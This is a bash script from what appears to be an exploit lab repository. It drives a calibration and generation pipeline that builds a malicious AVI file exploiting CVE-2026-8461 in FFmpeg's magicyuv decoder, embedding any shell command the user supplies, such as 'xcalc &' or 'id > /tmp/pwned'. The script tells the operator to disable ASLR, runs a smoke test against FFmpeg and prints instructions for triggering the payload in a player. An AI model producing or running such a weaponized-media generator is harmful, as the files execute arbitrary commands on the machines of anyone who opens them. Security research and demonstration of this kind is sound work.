#!/usr/bin/env bash
#
# lab/prepare_paylaods.sh
#
# Generates a calibrated CVE-2026-8461 exploit AVI. The AVI filename
# is derived from the payload command, and calibration is run fresh
# against that exact path.
#
# Usage:
#   lab/prepare_paylaods.sh "xcalc &"
#   lab/prepare_paylaods.sh "id > /tmp/pwned"
#
# Environment overrides:
#   VIDS_DIR   (default: <repo>/lab/vids)
#   CMD        (alternative to passing the command as $1)
#
# ASLR NOTE:
#   The exploit requires ASLR to be disabled at the moment the AVI is
#   played, not at the moment it is generated. Disabling ASLR needs root,
#   so this script does NOT do it. Before running the demo, run:
#
#       sudo sysctl -w kernel.randomize_va_space=0
#
#   After the demo, you can re-enable it with:
#
#       sudo sysctl -w kernel.randomize_va_space=2

set -e
ulimit -c 0

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

POC_DIR="$REPO_ROOT/exploit"
FFMPEG_BIN="/usr/local/bin/ffmpeg"
FFMPEG_LIB="/usr/local/lib"
VIDS_DIR="${VIDS_DIR:-$REPO_ROOT/lab/vids}"
CALIBRATION="/tmp/calibration.json"

CMD="${1:-${CMD:-xcalc &}}"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

info() { echo -e "\n\033[1;34m[*]\033[0m $*"; }
ok()   { echo -e "\033[1;32m[+]\033[0m $*"; }
warn() { echo -e "\033[1;33m[!]\033[0m $*"; }
die()  { echo -e "\033[1;31m[✗]\033[0m $*" >&2; exit 1; }

make_name() {
    local cmd="$1"
    local first="${cmd%% *}"
    local safe
    safe=$(printf '%s' "$first" \
        | tr -c 'A-Za-z0-9._-' '_' \
        | sed -E 's/_+/_/g; s/^_+//; s/_+$//')
    [ -z "$safe" ] && safe="payload"
    echo "${safe}.avi"
}

# ---------------------------------------------------------------------------
# ASLR notice — printed on every run
# ---------------------------------------------------------------------------

echo
echo "============================================================"
echo "  ASLR NOTICE"
echo "============================================================"
echo
echo "  The exploit only works when ASLR is disabled. This script"
echo "  does not disable it for you. Before running the demo:"
echo
echo "      sudo sysctl -w kernel.randomize_va_space=0"
echo
echo "  Verify with:"
echo
echo "      cat /proc/sys/kernel/randomize_va_space   # should print 0"
echo
echo "  To re-enable ASLR after the demo:"
echo
echo "      sudo sysctl -w kernel.randomize_va_space=2"
echo

CURRENT_ASLR=$(cat /proc/sys/kernel/randomize_va_space)
if [ "$CURRENT_ASLR" = "0" ]; then
    ok "ASLR is currently disabled (randomize_va_space=0)."
else
    warn "ASLR is currently ENABLED (randomize_va_space=$CURRENT_ASLR)."
    warn "The AVI will still be generated, but it will NOT fire its"
    warn "payload until you disable ASLR with the command above."
fi

# ---------------------------------------------------------------------------
# Checks
# ---------------------------------------------------------------------------

[ -d "$POC_DIR" ] || die "$POC_DIR not found."
[ -f "$POC_DIR/auto_calibrate_nosym.py" ] \
    || die "$POC_DIR/auto_calibrate_nosym.py not found."
[ -f "$POC_DIR/exploit_cve_2026_8461.py" ] \
    || die "$POC_DIR/exploit_cve_2026_8461.py not found."
[ -x "$FFMPEG_BIN" ] || die "$FFMPEG_BIN not found."

mkdir -p "$VIDS_DIR"

VER=$("$FFMPEG_BIN" -version 2>&1 | head -1)
case "$VER" in
    *n8.0.1*) ok "FFmpeg: $VER" ;;
    *) die "Wrong FFmpeg version. Expected n8.0.1, got: $VER" ;;
esac

"$FFMPEG_BIN" -decoders 2>/dev/null | grep -q magicyuv \
    || die "magicyuv decoder missing."

AVI_NAME=$(make_name "$CMD")
AVI_PATH="$VIDS_DIR/$AVI_NAME"

info "Command:  $CMD"
info "AVI name: $AVI_NAME"
info "AVI path: $AVI_PATH"

# ---------------------------------------------------------------------------
# Calibrate
# ---------------------------------------------------------------------------

info "Calibrating..."
rm -f "$CALIBRATION"

python3 "$POC_DIR/auto_calibrate_nosym.py" \
    --ffmpeg  "$FFMPEG_BIN" \
    --libpath "$FFMPEG_LIB" \
    --avi     "$AVI_PATH" \
    -o        "$CALIBRATION"

[ -f "$CALIBRATION" ] || die "Calibration failed."
ok "Calibration: $CALIBRATION"

# ---------------------------------------------------------------------------
# Generate the AVI
# ---------------------------------------------------------------------------

info "Generating AVI..."
rm -f "$AVI_PATH"

python3 "$POC_DIR/exploit_cve_2026_8461.py" \
    --calibration "$CALIBRATION" \
    --cmd "$CMD" \
    -o "$AVI_PATH"

[ -f "$AVI_PATH" ] || die "AVI generation failed."
ok "AVI written: $AVI_PATH ($(stat -c%s "$AVI_PATH") bytes)"

# ---------------------------------------------------------------------------
# Smoke test (only if ASLR is already off)
# ---------------------------------------------------------------------------

if [ "$CURRENT_ASLR" = "0" ]; then
    info "Smoke test..."
    LD_LIBRARY_PATH="$FFMPEG_LIB" "$FFMPEG_BIN" -i "$AVI_PATH" -f null - || true
else
    warn "Skipping smoke test — ASLR is enabled, so the payload"
    warn "would not fire anyway. Re-run after disabling ASLR."
fi

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

echo
ok "Done."
echo
echo "  Trigger:"
echo "    LD_LIBRARY_PATH=$FFMPEG_LIB $FFMPEG_BIN -i $AVI_PATH -f null -"
echo
echo "  Player:"
echo "    $REPO_ROOT/player/build/ffplayer"
echo "    Open... -> $AVI_PATH"
echo
if [ "$CURRENT_ASLR" != "0" ]; then
    warn "Reminder: disable ASLR before the demo:"
    warn "  sudo sysctl -w kernel.randomize_va_space=0"
    echo
fi
